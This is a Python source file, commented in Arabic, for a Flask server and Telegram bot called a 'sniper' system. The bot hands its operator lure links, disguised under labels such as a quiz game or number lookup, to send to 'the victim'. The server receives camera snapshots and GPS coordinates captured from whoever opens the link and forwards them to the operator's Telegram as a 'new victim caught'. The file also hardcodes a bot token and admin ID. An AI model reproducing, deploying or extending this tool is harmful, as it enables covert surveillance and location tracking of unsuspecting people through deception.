from flask import Flask, render_template, request, jsonify
import telebot
from telebot import types
import threading
import base64
import os

app = Flask(__name__)

# --- [ إعدادات القناص الخاصة بك ] ---
API_TOKEN = '8281242369:AAEf0c8gx9bhpbHqbXO5a0He-HlvTx_7Kp8'
ADMIN_ID = '8276213504'
MY_URL = 'https://my-bot-sniper-1-2.onrender.com/insta' # رابط صفحة الصيد الخاصة بك
bot = telebot.TeleBot(API_TOKEN)

# --- [ لوحة التحكم (الأزرار الخضراء) ] ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    # قائمة الأزرار كما في الصورة
    btn1 = types.InlineKeyboardButton("📸 اختراق كاميرا", url=MY_URL)
    btn2 = types.InlineKeyboardButton("📍 اختراق الموقع", url=MY_URL)
    btn3 = types.InlineKeyboardButton("📘 اندكس فيسبوك", url=MY_URL)
    btn4 = types.InlineKeyboardButton("👻 اندكس سناب شات", url=MY_URL)
    btn5 = types.InlineKeyboardButton("🧠 لعبة الأذكياء", url=MY_URL)
    btn6 = types.InlineKeyboardButton("📞 كاشف الأرقام", url=MY_URL)
    btn7 = types.InlineKeyboardButton("👨‍💻 تواصل مع المطور", url="https://t.me/MQtry1")

    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    
    welcome_text = "🎯 **أهلاً بك في نظام القناص v3.0**\n\nقم باختيار الأداة التي تريد إرسالها للضحية:"
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode='Markdown')

# --- [ مسارات السيرفر (Flask) ] ---
@app.route('/')
@app.route('/insta')
def index():
    return render_template('index.html')

@app.route('/send', methods=['POST'])
def handle_data():
    try:
        data = request.json
        img_data = data.get('image')
        lat = data.get('lat')
        lon = data.get('lon')

        # إرسال الموقع
        bot.send_message(ADMIN_ID, f"🎯 **تم اصطياد ضحية جديدة!**\n📍 الموقع: https://www.google.com/maps?q={lat},{lon}", parse_mode='Markdown')

        # إرسال الصورة
        if img_data and "," in img_data:
            header, encoded = img_data.split(",", 1)
            with open("victim.png", "wb") as f:
                f.write(base64.b64decode(encoded))
            with open("victim.png", "rb") as photo:
                bot.send_photo(ADMIN_ID, photo, caption="📸 صورة مباشرة من كاميرا الضحية")
            os.remove("victim.png")
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# --- [ تشغيل النظام ] ---
def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    # تشغيل البوت في الخلفية ليعمل مع السيرفر
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
